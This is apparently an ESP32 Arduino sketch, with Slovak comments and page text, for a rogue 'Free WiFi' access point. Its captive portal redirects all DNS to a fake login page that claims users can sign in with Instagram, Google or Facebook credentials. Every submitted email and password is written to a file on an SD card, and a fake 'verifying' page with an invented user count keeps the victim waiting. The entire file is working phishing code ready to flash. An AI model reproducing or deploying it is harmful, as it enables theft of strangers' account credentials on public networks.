#include <WiFi.h>                   // Knižnica pre ESP32 WiFi
#include <DNSServer.h>
#include <WebServer.h>              // Knižnica pre ESP32 WebServer
#include <SD.h>                     // Knižnica pre SD kartu
#include <SPI.h>                    // Knižnica pre SPI komunikáciu so SD kartou

// ------------------------------------------------------------------------------
// CONNECTION

// SD Card Module (Connection for SD Card Module with ESP32)
// VCC -> 3.3V
// GND -> GND
// MOSI -> 23
// MISO -> 19
// SCK -> 18
// CS -> 5
// ------------------------------------------------------------------------------

// SD karta nastavenia
#define SD_CS_PIN 5  // Nastav pin pre CS (Chip Select) pre SD kartu

// User configuration
#define SSID_NAME "Free WiFi"
#define SUBTITLE "Free WiFi service."
#define TITLE "Prihlásenie"
#define BODY "Je možné prihlásiť sa napríklad cez Instagam, Google, Facebook pre internetové pripojenie.</br>Ak sa nedokážete pripojiť, skuste to znovu a skontrolujte Email alebo heslo"
#define POST_TITLE "Overuje sa..."
#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie.</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stav: Zatial ste OFFLINE</br>Ak sa nedokážete pripojiť, skontrolujte vaše prihlasovacie údaje>"
#define PASS_TITLE "Credentials"
#define CLEAR_TITLE "Cleared"

// Function prototypes
String posted();
void saveCredentialsToSD(String email, String password); 

// Init System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
IPAddress APIP(172, 0, 0, 1);  

DNSServer dnsServer;
WebServer webServer(80);

// Funkcia na uloženie údajov na SD kartu
void saveCredentialsToSD(String email, String password) {
  File dataFile = SD.open("/htmldata.txt", FILE_APPEND);  // Otvoríme súbor na zápis

  if (dataFile) {
    dataFile.println("Nove Udaje");
    dataFile.print("Email: ");
    dataFile.println(email);     // Uložíme email
    dataFile.print("Heslo: ");
    dataFile.println(password);  // Uložíme heslo
    dataFile.println("--------------------");
    dataFile.close();  // Zatvoríme súbor
    Serial.println("Data ulozene do SD Karty");
  } else {
    Serial.println("Chyba pri otvarani suboru.");
  }
}

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
    "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav><b>"+a+"</b> "+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>";
  return h; 
}

String posted() {
  String email = input("email");
  String password = input("password");

  // Ulož email a heslo na SD kartu
  saveCredentialsToSD(email, password);

  return header(POST_TITLE) + POST_BODY + "</div><div><p>Email: <b>" + email + "</b></p><p>Heslo: <b>" + password + "</b></p></div>";
}

void setup() {
  // Inicializácia sériového portu
  Serial.begin(115200);
  
  // Inicializácia SD karty
  if (!SD.begin(SD_CS_PIN)) {
    Serial.println("Chyba pri otvarani SD karty !");
    return;
  }
  Serial.println("SD karta inicializovana.");

  // Nastavenie Wi-Fi v režime Access Point (AP)
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  
  dnsServer.start(DNS_PORT, "*", APIP);

  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
  });
  
  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='email' name='email'><br><b>Heslo:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
  });
  
  webServer.begin();
  Serial.println("HTTP server started...");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
